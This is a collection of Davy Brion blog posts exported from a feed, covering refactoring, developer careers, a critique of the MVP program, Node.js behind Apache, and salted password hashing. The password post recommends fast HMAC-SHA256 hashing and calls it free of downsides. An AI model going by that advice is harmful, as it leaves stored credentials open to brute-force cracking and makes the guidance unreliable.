The second time you do something similar, you wince at the duplication, but you do the duplicate thing anyway. The third time you do something similar, you refactor.</p></blockquote><p>That's a quote from Don Roberts, found in Martin Fowler's Refactoring book (page 58). That quote didn't really make me think twice at the time I read it, but it got stuck in my head later on when I heard it from someone who's always been very influential to me. When this person told me that this was one of his favorite rules, I was still in my \"no way dude, all code needs to be as clean as it can be\" phase. But it's really grown on me over the last few years. Now, just to avoid any confusion: this post is about <em>my interpretation</em> of 'Three Strikes And You Refactor', not about what may have been originally intended or what some people think of it now.</p><p>The most important thing I remember when learning about TDD was:</p><ol><li><p>Write a failing test</p></li><li><p>Do the simplest thing that could possibly work to make the test pass.</p></li><li><p>Refactor.</p></li></ol><p>With all the literature that's out there, as well as popular opinion on how important clean code is, it's tempting to go overboard with that 'refactor' step. It's tempting to go for the solution that is crispy clean. The solution that'll have your coworkers or peers go \"ohhh, now <em>that</em> is nice\". However, you really need to ask yourself the following question: \"is it really worth it?\". Wanting to make sure that every piece of code is perfect takes up a lot of time, and I've learned that it certainly isn't always worth it. Besides, it's quite easy to go off on a path of introducing new concepts and abstractions to your code that end up being totally unnecessary. If this increases complexity in parts that don't really matter, it ends up being a huge waste. Not only for the person who wrote it, but for every person who has to read it and comprehend it later on.</p><p>'Three Strikes And You Refactor' is a helpful rule of thumb here. Try to keep things as simple as possible and don't be afraid of a <em>little</em> duplication here or there. Once you find yourself (or a teammate) doing the same thing for a third time, it's worth cleaning up because that third time very often means that it wouldn't be the last time either. This way, you only introduce concepts and abstractions that are really needed, and enables you to avoid adding unnecessary cruft to the code.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OFSdEDuJMHc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1093}}

Be sure to read it if you haven't, because it's got some very good points, though I don't like the dig at people who contribute to open source since these people are having an ever increasing positive impact on our jobs. Anyways, the manifesto is about being a software developer without being defined by it. I actually think it's a healthy point of view.</p><p>I've always disagreed with this seemingly popular point of view or opinion that every developer should spend a lot of time outside of his/her working hours blogging or publishing their code on Github or contributing to open source. Those activities <em>can</em> be important but aren't necessarily so and the people doing them aren't inherently more valuable or important than developers who choose not to contribute to open source software or who don't feel the need to make a name for themselves. I also disagree with the notions that developers who are only involved with software development during their 8 working hours a day must be inferior or that they can't be passionate about it or that they'll never be great at it or any of that other crap that you'll sometimes hear people say.</p><p>I know some great developers who put their code out there and/or their thoughts by blogging. I also know some bad developers who put their code out there and/or their thoughts by blogging. I know some great developers who aren't involved with software development outside their working hours. I also know some bad developers who aren't involved with software development outside their working hours. There are good and bad developers on both sides of every situation you can come up with.</p><p>I think it depends a lot on what people do <em>during their 8 working hours</em>. Can we really say that developers who work 8 hours a day on challenging projects with strong co-workers in teams where knowledge is passed around continuously are missing out on anything if they don't really spend any other time on software development outside of work? That just doesn't make a lot of sense to me. If I look back on my own career so far, I've typically been rather passive outside of working hours in periods where I felt like I was working on cool things, where I was challenged, where I was learning a lot on the job. Conversely, I've always been much more involved with software development outside of work when I was working on things during working hours that I didn't find challenging or interesting or where I wasn't learning anything new. I'm guessing that this holds true for a lot of people, though certainly not all.</p><p>Of course, if you're not working on interesting things or continuously learning and improving on the job, it's your own responsibility to make sure that your skills and insights stay up to date. You don't <em>have</em> to put in the effort to do that, but if you don't, you don't really have a reason to complain either when you're not happy with the kind of work that you're doing. Your employer is not responsible for your career and your future, you are.</p><p>And if you are working on interesting things and continuously learning and improving on the job, you don't need to pressure yourself to do more outside of your working hours because certain people in the community say you should. A lot of people get involved with blogging and open source with the hope that it'll end up leading to more interesting work in the long term. Who knows, you might just be a step ahead of them already.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/uXaRMjqjhFA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1094}}

Give Me A Break.","published":{"$wrap":"$date","v":1334513509000,"h":"2012-04-15T18:11:49.000Z"},"starred":false,"read":false,"content":"<p>I've always been very skeptical of Microsoft's MVP award. Officially, Microsoft's MVP award stands for Most Valuable Professional, but its true meaning is probably closer to Most Valuable Promoter. The quality and integrity of the MVP's you know is probably dependent on the region in which you work. I work in Belgium, and over here the MVP program is, in my opinion, a joke. I'm going to discuss why I think it's a joke but keep in mind that this will depend on your region. I know that there are indeed great MVP's out there who do have professional integrity and true real world experience in some regions, but I certainly wouldn't be surprised if the state of the MVP program in Belgium occurs in other regions as well.</p><p>First of all, let's take a look at an image that Microsoft uses on its <ahref=\"http://mvp.support.microsoft.com/\">MVP page</a>:</p><p><imgsrc=\"http://davybrion.com/mvp.png\" alt=\"MVP image\" /></p><p>\"Independent Experts. Real world Answers.\"</p><p>This is indeed what the MVP program <em>should</em> be about. It is however the exact opposite of what I and many others in Belgium have experienced. Let's cover the words in those 2 sentences a bit more in-depth.</p><h3>Independent</h3><p>Most of the .NET MVP's in Belgium work for a handful of companies that happen to be big sponsors of every important Microsoft event in Belgium. Now, could it be possible that the best .NET developers in Belgium all work for these handful of companies? I highly doubt it. I know a lot of great developers in Belgium and none of them work for these companies. And I'm quite sure that none of those people are less valuable or knowledgeable than any of those MVP's. In my experience, there is hardly anything independent about the Belgian .NET MVP's. Most of them got their first MVP award while they were employed by sponsors or 'strategic partners' of Microsoft. Most of them tout the latest and greatest Microsoft technologies, pretty much unquestioned, even if it means contradicting their statements and positions when they were promoting the technology that Microsoft wanted them to promote 3 or 4 years ago. And they're never openly critical of anything Microsoft-related out of fear that it will negatively impact their chances of being renewed as an MVP. They may not work for Microsoft, but they are anything but independent of Microsoft.</p><h3>Experts</h3><p>This is a tough one. What makes one an expert? In some fields, people are considered to be experts based on the amount of research they've done. In other fields, people are considered to be experts based on what they've actually done. I don't think I'm going out on a limb here by saying that in the field of software development, what you've done <em>should</em> be more important than what you've researched or read about. In my opinion, an expert in a specific technology should have built at least one, and ideally more than one, non-trivial system using the technology in question and should be able to tell you about mistakes they've made, things you should avoid, and should never use examples that promote bad practices. I rarely hear MVP's talk about things you should avoid. I rarely hear MVP's talk about mistakes they've learned from. I routinely see examples from MVP's that make me cringe. I routinely hear MVP's promote technologies even though they haven't actually built anything impressive with it. I think of a lot of words when I see examples or proposed solutions by MVP's, but the word 'expert' unfortunately isn't one of them. This also applies to the Microsoft Extended Experts Team by the way. I can only question the validity of such a team if it contains people who are listed as experts of a particular technology when I happen to know for a fact that some of those people have never even used the technology they're supposed to be an expert in in a real world project. Let's be honest here: most of the MVP's and the MEET members simply aren't experts. They are people who have a strong interest in a particular (or more) technology and do their best to promote said technology. There's nothing wrong with that at all, but there's a huge difference between that and being an expert in something.</p><h3>Real world answers</h3><p>This one cracks me up the most because most of the Belgian MVP's hardly work on real world projects. And when they do, they typically work on \"multiple projects\" as they like to say it. For anyone who's ever worked on multiple projects at the same time: could you honestly say that your contributions were truly valuable to the end result? Let me put it differently: don't we all know that people generally produce the best results when they don't have to juggle too many things at once and can focus on as few things as possible? You will rarely hear about a Belgian MVP working full time on a non-trivial real-world project. A lot of them get to spend a certain number of paid hours each week on 'community work', which means blogging, writing articles for magazines, creating presentations for events, etc. When they're not working on that, you'll often find them talking on Twitter about pretty much anything but interesting or demanding work. And of course, their employers will occasionally send them to clients for a bit of consulting here or there, or to do a product demo. Unless these guys are putting in 60 to 80 hours a week (which I seriously doubt), I'm having trouble figuring out when exactly they do the kind of interesting work on real world projects that would enable them to provide answers based on real world experience.</p><p>It also doesn't help that I've frequently heard rather unflattering stories about these MVP's from people who've worked with them. It's pretty much always the same: they're not invested into the project, they spend too much time 'interacting with the community' and if you let them go near important parts of the code base, bad things usually happen. Now, I'm not the type of person who simply believes everything he hears. In fact, when it comes to matters like these, I generally only believe the stories I hear from people of whom I'm truly sure that they know what they're talking about. And if you've been reading this blog for a while, you'll know I'm rather critical and that I set the bar rather high when it comes to that.</p><p>Lastly, my personal working experience with MVP's has been abysmal as well. I once worked for a client where we had to get rid of 2 people because of how bad they performed in real world circumstances. One of them was an MVP at the time, and now works at Microsoft as an Evangelist. The other wasn't an MVP at the time, but has been one for a few years now and is even one of the Regional Directors of this region. A few years later, I had drinks with a manager of the company they both worked for and he bluntly admitted that both of them are useless on real projects but that their MVP status was a huge benefit to the company from a marketing and image perspective. Not exactly the image or branding I'd be looking to put out there, but hey, to each his own.</p><h3>Why On Earth Did I Write This?</h3><p>For 2 reasons. I think this whole MVP thing sets a bad example to young and impressionable developers who aren't sure what to focus on to advance their careers. To outsiders, these MVP's sure look like they've got a great thing going and it's easy to see how that could impress people who don't know better. There are already quite a few developers who suck up to these MVP's in the hopes of someday getting to 'that level' as well. I'd much rather see these people put effort into learning about concepts that will last them a long time and building skills that are transferable to multiple technologies instead of sucking up to the wrong people, and trying to network their way to more interesting work because the work that results from that is truly mediocre at best. By all means, try to make a name for yourself by blogging and speaking publicly. But do yourself a favor and stay true to yourself and favor quality over quantity when considering the audience you want to target. Hey, it worked for me <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>The second reason is because this whole MVP thing is, in my opinion at least, offensive to the many dedicated professionals who give their all at their jobs as they work on real projects that matter, as they try to mentor younger developers in their workplace, as they try to optimize the way they develop software not only for themselves, but for their teammates and their employers or clients. These are your true <em>valuable professionals</em>.</p><p>I'm sure I'm gonna get a lot of flak for this post, but honestly, it won't really make any difference to me. The people who'll be offended are people I'd rather not work with anyway. And of course, I feel quite confident that I'll rarely, if ever, have to deal with these people in a professional setting since I'm primarily interested in interesting and demanding work <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/v0N7GPTJ8-o\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1095}}

Of course, this approach only makes sense if you already have a server that's running Apache and you want to add your Node.js site with minimal impact/changes on your server. If you're not using Apache already but just want to publish a Node.js site, you're better off using Node.js to host it directly, or to put Nginx in front of it since it's more lightweight than Apache. But anyways, here's how you get it working with Apache.</p><p>First of all, you need a way to start your Node.js process automatically when your system boots, and to shut it down when the system is shut down. This will depend on the type of server you're running on. In my case, it's a Debian server so I just went with the <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/init.d\" target=\"_blank\">sysv init script from Nico Kaiser</a>. Another popular alternative is the upstart utility, which is already preinstalled if you're using Ubuntu. Once you have a start|stop|restart script in place, you'll want something to monitor the Node.js process to restart it in case it goes down. An easy to use tool for this is <ahref=\"http://mmonit.com/monit/\" target=\"_blank\">monit</a>. Nico Kaiser again has a good example script available for Node.js on <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/monit/conf.d\" target=\"_blank\">Github</a>.</p><p>Once you have your sysv init or upstart script in place, as well as monit, your Node.js process can stay running on your server. Of course, you probably have it set to listen to connections on some other port than port 80 because that's what your Apache server is listening on. So now, the only thing you have to do is configure Apache to proxy all requests coming in on port 80 through the URL of your Node.js site to your local Node.js process. You'll first need to install <ahref=\"http://httpd.apache.org/docs/2.1/mod/mod_proxy.html\" target=\"_blank\">mod_proxy</a> and <ahref=\"http://httpd.apache.org/docs/2.0/mod/mod_proxy_http.html\" target=\"_blank\">mod_proxy_http</a>. After that, the configuration to make it work is quite easy:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;VirtualHost 109.74.199.47:80&gt;ServerAdmin davy.brion@thatextramile.beServerName thatextramile.beServerAlias www.thatextramile.beProxyRequests off&lt;Proxy *&gt;Order deny,allowAllow from all&lt;/Proxy&gt;&lt;Location /&gt;ProxyPass http://localhost:3000/ProxyPassReverse http://localhost:3000/&lt;/Location&gt;&lt;/VirtualHost&gt;</pre></div><p>And that's it. Every request coming in at http://thatextramile.be or http://www.thatextramile.be will be forwarded to http://localhost:3000 where Node.js is listening. Note that the ProxyPassReverse is required to make sure that all HTTP response headers will contain the proxied URL instead of the real one (localhost).</p><p>If you need the raw throughput that Node.js offers, this solution is far from optimal. Every request that comes in through Apache will cause an Apache thread to wait/block until the response is returned from your Node.js process. This is essentially the same as when hosting PHP or Ruby through Apache, so it's not a problem, but it does take away one of the benefits of using Node.js. Again, this approach only makes sense if you're already using Apache to host other sites and you just want to add a Node.js site with minimal impact to your server.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/r3DqhWiU0Qc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1096}}

Even though the source code of ASP.NET MVC has always been available under an open source license, its development followed a closed development model. This meant that outside contributions weren't possible, nor were we able to follow the actual commits in the MVC source code repository. With the recent announcements, this is no longer the case and I think this is fantastic news. It finally enables collaboration between Microsoft employees and people outside of Microsoft on a strategically important Microsoft product. This is good for Microsoft as well as the open source .NET community.</p><p>I hope that this newfound appreciation for Open Source within Microsoft will lead to another huge improvement in collaborative development in the open source .NET community. While Microsoft is now open to accepting contributions from the community, it would be a tremendous step forward if Microsoft would also contribute to other prominent open source .NET projects in the future. In the past, we've seen numerous open source .NET projects become popular and widely used. And unfortunately, Microsoft responded to some of those projects by producing their own libraries and frameworks that basically do the same thing. Except that, for most of those projects, they never quite matched the quality of the open source projects they were inspired by. If only all of that effort spent on duplicating already existing libraries would've been spent on <em>improving what was already there</em>, the entire .NET community would've been better for it.</p><p>I'd love to see a Microsoft that works <em>with</em> open source developers and encourages them, instead of trying to duplicate their efforts whenever they feel they need to provide their own library or framework for something that's already covered by a superior open source alternative. These duplicated projects only alienate people that at one point were passionate enough about the .NET platform to work on improving it for free, in their spare time. These are the people that Microsoft needs to cherish and nourish instead of competing with them. Microsoft has shown some interesting signs of better understanding of open source development and collaboration in the past year or so.

There's one part in the post that I don't entirely agree with:</p><blockquote><p>I like to believe learning should be a hands-on activity as well. Basically, stop consuming, start producing. Don't get me wrong, I do think there is value in reading blog posts (I might be slightly biased on this one), reading books and watching videos, but I find that this value is marginal compared to what you gain by actually doing it.</p></blockquote><p>Hands-on activity (producing) is certainly a very important part of any learning process, but I wouldn't go as far saying that the value of reading books/blogs (consuming) is marginal compared to that of producing. In fact, I believe their value to be pretty equal. I've seen too many people who start producing simple things, and then think they've got a pretty good grasp of the technology they're using and then move on to producing more complex or bigger things without actually knowing enough of the technology they're using to support the more complex or bigger scenarios. The results certainly aren't always pretty and I'm sure each and every one of you has seen this scenario unfold with at least one developer you know. Probably more than that even.</p><p>I think in a lot of cases, people start the producing phase perhaps a bit too early and then in their enthusiasm of seeing things working sort of skip the more boring consuming that could've benefitted them a lot. Once you've started producing, you <em>need</em> to keep consuming regularly. A tremendously valuable part of any learning experience is getting feedback and insight from minds that have more experience with a given subject than yours. If you're lucky, you can get this from your coworkers. If you're not that lucky, you'll need to find other sources and books, blogs, videos, user group meetings, etc can be a great way to fill that void. And even if you do get to learn a lot from your coworkers, it <em>never</em> hurts to learn more from the experiences of others outside of your immediate circle, if only because their situations and constraints will differ from yours as well.</p><p>The other very important part about consuming is really getting to know the technology you're trying to learn. I've always found it very important to at least get an idea of how things work internally within a technology that I'm using. You certainly don't need to know all of the implementation details but just having an idea of it can really help you avoid a lot of problems once you need to use a technology in a more advanced way than in your initial experiments. Most importantly, it should give you better insights as to whether you're using the technology <em>properly</em>, which unfortunately isn't always the same as getting something working. And as a bonus, you'll probably learn about features you won't immediately need but knowing that they're there can save quite a bit of time and effort later on. Just imagine the improvement of the signal-to-noise ratios that you'd see on mailinglists, forums, and StackOverflow if everyone took the time to get a better grasp of the technologies they're using.</p><p>When I start with learning new libraries or frameworks, I usually start off by reading most (and often, all) of the official documentation of the technology before I even get into building something myself. If I want to learn a new programming language I'll look for the most recommended books for that language and buy one (or more, if I wasn't satisfied with the first one). I won't even start using the language until I've gone through the book. Once I feel like I've got a pretty good theoretical grasp of the technology, I start building something with it. I also start looking for good blogs on the technology and subscribe to them. I'll also start following influential people of the technology on Twitter. And I just continuously try to soak up as much knowledge as I can from people who're doing more impressive things with the technology than I am. At first, you might not understand everything they're talking about but after a while, things just start clicking and you're getting a really good grasp of things. None of this is a substitute for learning from producing, but it certainly is an incredible addition to it. And one that makes a world of difference, IMO.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OUX2zAPDwqw\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1099}}

The many Anonymous hacks in the past year that resulted in the leaking of users' passwords also show that many sites still store passwords in either clear-text or encrypted form. It's actually quite simple to store credentials safely, so here's a quick recap and example.</p><p>The biggest issue with storing passwords is that you have to assume that it's always possible that someone can get access to your database. Yes, even if it's not directly exposed to the outside world, which it <strong>never</strong> should be. Whatever security measures you've put in place to protect your database, it's a good idea to assume that sooner or later, someone will be able to punch a hole through your security measures and be able to read the data. So obviously, you really don't want to store clear-text passwords. You also don't want to store encrypted passwords because encrypted data can always be decrypted. And if people get access to those encrypted passwords even if they weren't supposed to, it'd be wise to assume that they also know how to decrypt them, or that it won't take them long to figure it out.</p><p>A much better approach is to store a hashed representation of the password instead, using a strong one-way cryptographic algorithm and a <strong>unique</strong> salt value per password. If the cryptographic algorithm is one-way, it means you can't apply another algorithm to get the original source value again. The only way to compare passwords is to apply the cryptographic algorithm on a given password using the originally used salt value, and then compare the resulting hash with the one you've stored. If they are identical, the given password is the same as the one that was used originally. If they differ, the password is invalid.</p><p>Attackers can still employ <ahref=\"http://en.wikipedia.org/wiki/Rainbow_table\">rainbow tables</a> to try to find password values that generate the same hashes as the ones in your database. Luckily, generating rainbow tables takes time and plenty of space as well so it makes it much harder for attackers to find the passwords. This is why it's so important to use a unique salt value per password. It effectively means that a rainbow table would have to be generated for every single salt value that you've used, making it practically infeasible to find the original password values.</p><p>Let's demonstrate this with a simple example. The example is from a Node.js application, but this technique can be applied with whatever technology stack you're using.</p><p>This is my User model:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var mongoose = require('mongoose'),crypto = require('crypto'),uuid = require('node-uuid'),Schema = mongoose.Schema,ObjectId = Schema.ObjectId;var userSchema = new Schema({name: { type: String, required: true, unique: true },email: { type: String, required: true },salt: { type: String, required: true, default: uuid.v1 },passwdHash: { type: String, required: true }});var hash = function(passwd, salt) {return crypto.createHmac('sha256', salt).update(passwd).digest('hex');};userSchema.methods.setPassword = function(passwordString) {this.passwdHash = hash(passwordString, this.salt);};userSchema.methods.isValidPassword = function(passwordString) {return this.passwdHash === hash(passwordString, this.salt);};mongoose.model('User', userSchema);module.exports = mongoose.model('User');</pre></div><p>Notice that the salt property of my User type has its default value set to 'uuid.v1'. In this case, uuid.v1 is a function which will be invoked by Mongoose whenever a new User instance is created. Every User instance will thus have a UUID value stored in its salt property. You can also see that I'm not storing the given passwordString in the setPassword function, but that I calculate the hash value based on the passwordString and the UUID salt value.</p><p>Suppose I create a user with the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var user = new User({name: 'test_user',email: 'blah'});user.setPassword('test');user.save(function(err, result) {if (err) throw err;});</pre></div><p>Its database representation will look like this:</p><div><pre class=\"brush: jscript; title: ; notranslate\">{\"passwdHash\" : \"b604367796274cf64177eec345532fc6ca66c6f0501906f82bb03f7916265e9d\",\"name\" : \"test_user\",\"email\" : \"blah\",\"_id\" : ObjectId(\"4f1dbb2cfa6157b118000001\"),\"salt\" : \"304a33f0-45fc-11e1-80d2-43c594a44fa0\"}</pre></div><p>If an attacker would get access to this, he'd have to generate a rainbow table using the salt value, which takes time, and even then he has no guarantee that the rainbow table will actually contain the correct password. Again, this is why it's so important to use a unique salt for every password. Also, you can use whatever value you want as the salt value so if you can determine it based on some other fields or by using a specific formula you don't need to store the actual salt value. It's recommended to use a long salt value though. Theoretically speaking, it's safer if the salt value isn't stored so clearly as I'm doing here, but even with the salt value clearly visible to a possible attacker, it would still be practically infeasible for him to generate all those rainbow tables.</p><p>And of course, my actual authentication function is still very simple as well:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var authenticate = function(username, password, callback) {User.findOne({ name: username }, function(err, user) {if (err) return callback(new Error('User not found'));if (user.isValidPassword(password)) return callback(null, user);return callback(new Error('Invalid password'));});};</pre></div><p>So as you can see, there's nothing hard or complicated about storing credentials in a secure manner. It's quite easy to do so and there are no downsides to doing this.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/bskd34YcIcg\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1101}}

Things have gone very well, and I'm amazed at how quickly it all went by. This time last year, I was looking forward to start working for my first client though I didn't quite know what to expect. I hoped it would be interesting, and it certainly has been. I've been able to work with interesting technologies, with the kind of technical variety that I've come to really enjoy. I wrote more code in JavaScript than in C# this year, and I've also been able to do quite a bit of Ruby as well. I certainly didn't expect that going into this contract, so that was a major bonus. Even better than the technologies I've been able to work with this year are the people I've worked with. The team I've worked with has a fantastic mix of experience, knowledge and talent and it feels like all of us continuously learn new things from each other which is a situation I can only recommend to every developer.</p><p>Another great part about being independent is that you're free to do extra things on the side as well. I'm very happy with the responses that I've gotten from the people who've taken my <ahref=\"http://thatextramile.be/training/nhibernate\">NHibernate course</a>, and I'm going to continue to offer it in 2012. I initially thought it would be something I'd do once or twice, but I was able to do the course 4 times this year: 1 public and 3 private ones. I've got another private one scheduled in February and will organize another public course in 2012, though this time I'm taking care of the whole thing myself instead of working with another company to organize it.</p><p>The most important thing I've learned from this first year is that it's important not to try to do too much. The first 6 months of 2011 were way too busy and hectic, and I only spent one full day doing absolutely nothing work-related. I've been taking things much slower since July and I'm spending much more time enjoying other things in life outside of work. For 